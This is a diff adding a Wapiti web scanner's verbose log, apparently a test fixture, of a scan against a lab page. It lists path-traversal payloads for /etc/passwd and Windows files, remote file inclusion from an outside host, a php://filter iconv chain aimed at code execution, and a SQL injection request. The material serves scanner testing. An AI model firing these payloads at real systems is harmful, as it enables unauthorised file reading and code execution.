+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:24.004 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:24.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=sqli_1.php&bug=13
+2024-03-20 16:41:24.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=sqli_1.php%00&bug=13
+2024-03-20 16:41:24.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=sqli_1.php%3A%3A%24DATA&bug=13
+2024-03-20 16:41:24.028 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:41:24.034 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:41:24.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd
+2024-03-20 16:41:24.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.051 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices
+2024-03-20 16:41:24.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices%00
+2024-03-20 16:41:24.063 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:41:24.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:41:24.074 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:41:24.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.086 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.092 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:41:24.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:41:24.104 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:41:24.109 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:24.115 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:24.121 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:24.138 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:24.143 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:24.150 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:24.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.161 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.167 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.172 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.178 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:41:24.185 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:24.190 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:24.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.203 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.208 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:24.215 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:24.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:24.237 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:24.247 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.257 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.267 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.290 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:24.302 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:41:24.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.341 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:24.353 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:24.366 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:24.379 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:24.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.417 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.429 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.442 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:41:24.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:41:24.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:41:24.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:41:24.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:41:24.497 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:41:24.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:24.518 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:24.529 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=sqli_1.php
+2024-03-20 16:41:24.539 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=sqli_1.php%00
+2024-03-20 16:41:24.550 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=sqli_1.php%3A%3A%24DATA
+2024-03-20 16:41:24.583 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 16:41:24.602 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:24.616 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 16:41:24.721 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 16:41:24.735 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:24.735 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 16:41:24.735 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 16:41:24.781 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 16:41:24.823 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : security_level
+2024-03-20 16:41:24.823 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : security_level
+2024-03-20 16:41:24.864 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : security_level
+2024-03-20 16:41:24.951 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 16:41:24.965 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:25.005 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:25.025 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:25.035 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:41:25.052 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13
+2024-03-20 16:41:25.079 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 16:41:25.090 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
+2024-03-20 16:41:25.091 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/sqli_1.php?title=fuzz%C2%BF%27%22%28&action=search (0)
+2024-03-20 16:41:25.171 | RED      | wapitiCore.attack.mod_sql:error_based_attack:393 - ---
+2024-03-20 16:41:25.171 | RED      | wapitiCore.attack.mod_sql:error_based_attack:394 - SQL Injection (DBMS: MySQL) in http://web/sqli_1.php via injection in the parameter title
+2024-03-20 16:41:25.172 | RED      | wapitiCore.attack.mod_sql:error_based_attack:400 - Evil request:
+2024-03-20 16:41:25.172 | RED      | wapitiCore.attack.mod_sql:error_based_attack:401 -     GET /sqli_1.php?title=fuzz%C2%BF%27%22%28&action=search HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:41:25.172 | RED      | wapitiCore.attack.mod_sql:error_based_attack:402 - ---
